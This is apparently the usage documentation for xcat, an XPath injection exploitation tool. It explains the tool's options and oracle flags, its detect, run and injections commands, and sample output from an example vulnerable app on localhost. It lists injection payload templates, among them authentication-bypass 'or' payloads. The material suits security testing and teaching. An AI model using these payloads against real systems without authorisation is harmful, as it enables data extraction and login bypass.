# Common options

All commands except `ip` take the same arguments. These describe the attack you are making, 
and allows xcat to explore it and work out what features it can use.

At _minimum_ you need to supply:

- A URL to attack (`url`)
- A target parameter which is vulnerable to XPath injection (`target_parameter`)
- A value for this parameter, and optionally others if required (`parameters`)
- An **oracle** that tells xcat when the injected condition is True. Any one (or more) of:
    - `--true-string` — a substring present in the response body
    - `--true-regex` — a regex matched against the response body
    - `--true-code` — a response status code
    - `--true-location` — a substring of the redirect `Location` / final URL

  Each can be negated with a leading `!` (e.g. `--true-string='!Login failed'`). When several are
  given they must all agree (logical AND).

To attack the [example vulnerable application](https://github.com/orf/xcat_app) you would use:

`xcat run http://localhost:4567/ query query=Rogue --true-string=Lawyer` 

This instructs `xcat` that:

- The vulnerable URL is `http://localhost:4567/`
- The vulnerable parameter is `query`
- The parameters to pass to the URL are `query=Rogue`
- The true condition is `Lawyer` being present in the response

## Additional options

#### `--headers`

This argument can be used to send custom headers, including cookies. It should be a file path to a plain text 
file containing lines in the following format:

```text
Header-Name: header-value
```

**Example:** `xcat run ... --headers=my-header-file.txt`

#### `--body`

This argument is a path to a file containing a request body to send. This is helpful if you are exploiting a 
POST request that has a vulnerable URL parameter, but also require a POST body to be sent. The file contents 
are sent as-is.

**Example:** `xcat run ... --headers=my-request-body.txt`

#### `--encode`

xcat currently supports manipulating either URL or form parameters. This allows you to switch between 
sending the exploit payload via the POST body or URL arguments.

**Example:** `xcat run ... --encode=form`

#### `--fast`

When this flag is present then xcat will only retrieve the first 15 characters of strings. This can drastically speed
up retrieval in documents that contain very large strings.

**Example:** `xcat run ... --fast`

#### `--concurrency`

This parameter limits the number of concurrent connections xcat can make. Setting it too low will slow down 
exploitation, but can reduce the load on the target server.

**Example:** `xcat run ... --concurrency=10`

#### `--enable/--disable`

xcat attempts to intelligently detect what features the target server supports and uses these to speed up 
retrieval. These flags let you force enable or disable these features.

**Example:** `xcat run ... --enable=substring-search`

#### `--oob`

Enables the `oob` server. For more info see [the oob server documentation.](OOB-server.md)

**Example:** `xcat run ... --oob=$EXTERNAL_IP:$EXTERNAL_PORT`

#### `--true-regex` / `--true-location`

Alternative oracles for when a fixed body substring isn't enough:

- `--true-regex` matches a regular expression against the response body.
- `--true-location` matches a substring against the redirect `Location` header / final URL. This is
  the oracle to reach for in **authentication-bypass** style injections, where a successful and a
  failed login differ only by their redirect target (e.g. `Location: user.php` vs
  `Location: index.php?msg=Login failed!`) while the response bodies are otherwise identical.

Both can be negated with a leading `!`, and combine (logical AND) with the other oracle options.

**Example:** `xcat run ... --no-follow-redirects --true-location=user.php`

#### `--follow-redirects` / `--no-follow-redirects`

By default xcat **follows** HTTP redirects before evaluating the oracle, so a signal that only
appears after a 30x (e.g. a "Login failed" message rendered on the page you are redirected to) is
still seen. Pass `--no-follow-redirects` to evaluate the oracle against the raw 30x response
instead — required when the only true/false signal is the `Location` header itself. Use it together
with `--true-location` or `--true-code`.

**Example:** `xcat run ... --no-follow-redirects --true-code=302 --true-location=user.php`

# detect

This command will print out what injection xcat has detected, as well as a list of features and their status. You 
can use this to quickly explore an injection and different parameter values before commencing an attack.

```shell
$ xcat detect http://localhost:4567/ query query=Rogue --true-string=Lawyer
function call - last string parameter - single quote
Example: /lib/something[function(?)]

Detected features:
xpath-2: True
xpath-3: False
xpath-3.1: False
normalize-space: True
substring-search: True
codepoint-search: True
environment-variables: False
document-uri: True
base-uri: True
current-datetime: True
unparsed-text: False
doc-function: True
linux: False
expath-file: False
saxon: False
oob-http: False
oob-entity-injection: False
``` 

#### Troubleshooting "No injections detected"

When `detect` finds nothing it now tells you *why* where it can:

- **"The oracle matched EVERY probe"** — your oracle is true for every response (e.g. `--true-string`
  matches text present on every page) or its polarity is inverted. Fix the oracle or negate it with `!`.
- **"The oracle matched NO probe"** — either the parameter isn't injectable, or the oracle never
  recognises a true response. If the true/false signal is a redirect, try `--true-location` with
  `--no-follow-redirects`.

Injection points that are **not the last term** in a predicate — e.g. `…[username='?' and password='…']`,
the classic authentication bypass — are handled by the `string - … - double-or` injectors, which
isolate the trailing clause into a dead `or` branch. Before extraction xcat also re-checks that the
chosen injection still differentiates true from false, and aborts loudly rather than emitting a
fabricated document if it doesn't.

# run

This is the core function of xcat. It will retrieve the whole document that is being queried with the
vulnerable xpath expression.

```shell
$ xcat run http://localhost:4567/ query query=Rogue --true-string=Lawyer
<root first="1" second="2" third="">
	<!--My lovely library-->
	<books>
		<book>
			<title>
				Rogue Lawyer
			</title>
			<author>
				John Grisham
			</author>
...
```

# shell

This is one of the most powerful features of xcat. 
Please see [the dedicated `shell` documentation here](the-shell.md)


# injections

This command prints out all the injections xcat currently can use, along with the sample expressions 
xcat will use to test if this injection works.

```shell
$ xcat injections
Supports 14 injections:
Name: integer
 Example: /lib/book[id=?]
 Tests:
   ? and 1=1 = passes
   ? and 1=2 = fails
Name: string - single quote
 Example: /lib/book[name='?']
 Tests:
   ?' and '1'='1 = passes
   ?' and '1'='2 = fails
Name: string - single quote - or
 Example: /lib/book[name='?'] (or-based, use with dummy value)
 Tests:
   ?' or true() and '1'='1 = passes
   ?' or false() and '1'='1 = fails
Name: string - double quote
 Example: /lib/book[name="?"]
 Tests:
   ?" and "1"="1 = passes
   ?" and "1"="2 = fails
Name: string - double quote - or
 Example: /lib/book[name="?"] (or-based, use with dummy value)
 Tests:
   ?" or true() and "1"="1 = passes
   ?" or false() and "1"="1 = fails
Name: string - single quote - double-or
 Example: /lib/book[name='?' and pass='...'] (trailing-clause safe; isolates a dummy)
 Tests:
   xcatnomatch' or true() or ' = passes
   xcatnomatch' or false() or ' = fails
Name: string - double quote - double-or
 Example: /lib/book[name="?" and pass="..."] (trailing-clause safe; isolates a dummy)
 Tests:
   xcatnomatch" or true() or " = passes
   xcatnomatch" or false() or " = fails
Name: attribute name - prefix
 Example: /lib/book[?=value]
 Tests:
   1=1 and ? = passes
   1=2 and ? = fails
Name: attribute name - postfix
 Example: /lib/book[?=value]
 Tests:
   ? and not 1=2 and ? = passes
   ? and 1=2 and ? = fails
Name: element name - prefix
 Example: /lib/something?/
 Tests:
   .[true()]/? = passes
   .[false()]/? = fails
Name: element name - postfix
 Example: /lib/?something
 Tests:
   ?[true()] = passes
   ?[false()] = fails
Name: function call - last string parameter - single quote
 Example: /lib/something[function(?)]
 Tests:
   ?') and true() and string('1'='1 = passes
   ?') and false() and string('1'='1 = fails
Name: function call - last string parameter - double quote
 Example: /lib/something[function(?)]
 Tests:
   ?") and true() and string("1"="1 = passes
   ?") and false() and string("1"="1 = fails
Name: other elements - last string parameter - double quote
 Example: /lib/something[function(?) and false()] | //*[?]
 Tests:
   ?") and false()] | //*[true() and string("1"="1 = passes
   ?") and false()] | //*[false() and string("1"="1 = fails
```

# ip

This command is a convenience function to get your current external IP address. It takes 
no arguments.

```shell
$ xcat ip
123.210.60.90
```
